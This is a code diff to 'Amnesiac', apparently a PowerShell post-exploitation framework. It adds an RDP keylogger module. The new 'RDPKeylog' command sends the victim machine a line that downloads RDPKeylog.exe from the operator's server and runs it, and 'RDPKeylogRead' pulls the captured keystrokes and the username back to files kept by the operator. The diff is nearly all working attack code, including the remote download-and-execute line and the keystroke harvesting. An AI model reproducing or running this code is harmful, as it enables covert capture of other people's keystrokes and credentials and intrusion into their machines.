@@ -336,6 +336,7 @@ function Amnesiac {
 				"$($global:ServerURL)/Suntour.ps1",
 				"$($global:ServerURL)/Ferrari.ps1",
 				"$($global:ServerURL)/pwv.ps1",
+    				"$($global:ServerURL)/RDPKeylog.exe",
 				"$($global:ServerURL)/TGT_Monitor.ps1"
 			)
 			
@@ -1930,6 +1931,78 @@ function InteractWithPipeSession{
 				Write-Output ""
 			}
 			else {Write-Output "[-] Empty Keylog";Write-Output ""}
+			
+			continue
+			
+		}
+
+  		elseif($Command -eq "RDPKeylog"){
+			
+			$FinalCommand = "Invoke-WebRequest -Uri '$($global:ServerURL)/RDPKeylog.exe' -OutFile 'C:\Users\Public\Documents\RDPLog.exe';`$process = Start-Process -FilePath 'C:\Users\Public\Documents\RDPLog.exe' -PassThru;`$processId = `$process.Id"
+			
+			$sw.WriteLine("$FinalCommand")
+			$sw.Flush()
+			
+			while ($true) {
+				$line = $sr.ReadLine()
+				if ($line -eq "#END#") {
+					break
+				}
+			}
+			
+			$sw.WriteLine('Write-Output "[+] RDP Keylogger Loaded | Saving to c:\Users\Public\Documents | https://github.com/nocerainfosec/TakeMyRDP2.0";Write-Output "";Write-Output "[+] RDP Keylogger started with PID $($processId.Trim()). To kill it [Stop-Process -Id $($processId.Trim())]"')
+			$sw.Flush()
+		}
+		
+		elseif($command -eq "RDPKeylogRead"){
+			
+			$sw.WriteLine('$env:username')
+			$sw.Flush()
+
+			$TempUsernameGrab = ""
+			while ($true) {
+				$line = $sr.ReadLine()
+				if ($line -eq "#END#") {
+					break
+				}
+				$TempUsernameGrab += $line
+			}
+			
+			$sw.WriteLine("try{type c:\Users\Public\Documents\RDP_log.txt | Out-String -Width 4096}catch{}#")
+			$sw.Flush()
+			
+			$KeylogContent = ""
+			while ($true) {
+				$line = $sr.ReadLine()
+				if ($line -eq "#END#") {
+					if($KeylogContent){
+						Write-Output $KeylogContent.Trim()
+						Write-Output ""
+					}
+					break
+				}
+				$KeylogContent += $line
+			}
+			
+			$counter = 0
+			$directory = "c:\Users\Public\Documents\Amnesiac\Keylogger"
+			$baseFileName = $TempUsernameGrab + "_" + "RDPKeylog"
+			$fileExtension = ".txt"
+			$fileName = Join-Path -Path $directory -ChildPath ($baseFileName + $fileExtension)
+
+			# If the file exists, keep incrementing the counter and updating the filename
+			while (Test-Path $fileName) {
+				$counter++
+				$fileName = Join-Path -Path $directory -ChildPath ($baseFileName + "($counter)" + $fileExtension)
+			}
+			
+			# Save clipboard to file
+			if($KeylogContent){
+				[System.IO.File]::WriteAllText($fileName, $KeylogContent)
+				Write-Output "[+] RDP Keylog saved to $fileName"
+				Write-Output ""
+			}
+			else {Write-Output "[-] Empty RDP Keylog";Write-Output ""}
 			
 			continue
 			
@@ -4170,6 +4243,8 @@ function Get-AvailableCommands  {
 	Write-Output " History            Get pwsh history for all users"
 	Write-Output " Keylog             Start Keylogger"
 	Write-Output " KeylogRead         Read Keylog output"
+ 	Write-Output " RDPKeylog          Start RDP Keylogger"
+	Write-Output " RDPKeylogRead      Read RDP Keylog output"
 	Write-Output " ScreenShot         Take a screenshot [1080p]"
 	Write-Output " Screen4K           Take a screenshot [4K]"
 	Write-Output ""
